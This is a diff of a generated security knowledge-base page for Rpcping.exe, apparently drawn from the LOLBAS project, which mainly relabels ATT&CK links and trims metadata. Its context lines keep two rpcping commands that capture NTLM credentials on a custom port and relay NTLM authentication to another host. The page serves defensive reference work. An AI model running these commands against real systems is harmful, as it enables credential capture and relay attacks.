@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/Rpcping.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "Rpcping.exe"
@@ -20,16 +20,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Rpcping.exe
-
 Used to verify rpc connection
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2018-05-25
-- Author: Oddvar Moe
-- Source Path: yml/OSBinaries/Rpcping.yml
 
 ## Paths
 
@@ -49,7 +40,7 @@ rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
 - Use Case: Capture credentials on a non-standard port
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping|T1003]]
+- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping|T1003: OS Credential Dumping]]
 
 ### 2. Credentials
 
@@ -62,7 +53,7 @@ rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
 - Use Case: Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1187-forced_authentication|T1187]]
+- ATT&CK: [[kb/attack/techniques/T1187-forced_authentication|T1187: Forced Authentication]]
 
 ## Detections
 
